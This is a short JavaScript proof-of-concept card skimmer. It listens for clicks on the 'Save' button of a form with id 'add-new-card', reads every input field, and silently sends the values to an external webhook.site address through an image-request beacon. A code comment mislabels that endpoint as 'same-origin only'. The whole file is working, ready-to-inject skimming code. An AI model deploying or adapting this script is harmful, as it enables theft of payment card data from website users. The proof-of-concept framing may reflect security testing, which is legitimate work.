(() => {
  console.log('[poc] loaded (GET beacon)');

  const FORM_ID = 'add-new-card';
  const SAVE_SELECTOR = 'button.hds-a-button--primary[aria-label="Save"]';
  const ENDPOINT = 'https://webhook.site/8ee964ab-b689-4081-a0da-68471ec7c8d2/'; // ✅ same-origin only

  if (window.__pocGetBeaconHooked) return;
  window.__pocGetBeaconHooked = true;

  document.addEventListener('click', (e) => {
    const saveBtn = e.target.closest?.(SAVE_SELECTOR);
    if (!saveBtn) return;

    const form = document.getElementById(FORM_ID);
    if (!form) return;

    const data = {};
    form.querySelectorAll('input, select, textarea').forEach((el) => {
      if (!el.name && !el.id) return;
      const key = el.name || el.id;

      if (el.type === 'checkbox') data[key] = el.checked;
      else if (el.type === 'radio') {
        if (el.checked) data[key] = el.value;
      } else {
        data[key] = el.value;
      }
    });

    const payload = {
      ts: Date.now(),
      path: location.pathname,
      formId: FORM_ID,
      data
    };

    const encoded = encodeURIComponent(JSON.stringify(payload));
    const url = `${ENDPOINT}?payload=${encoded}`;

    console.log('[poc] GET beacon →', url);

    // 🔥 fire-and-forget
    const img = new Image();
    img.src = url;

  }, true);

  console.log('[poc] delegated GET beacon active ✅');
})();
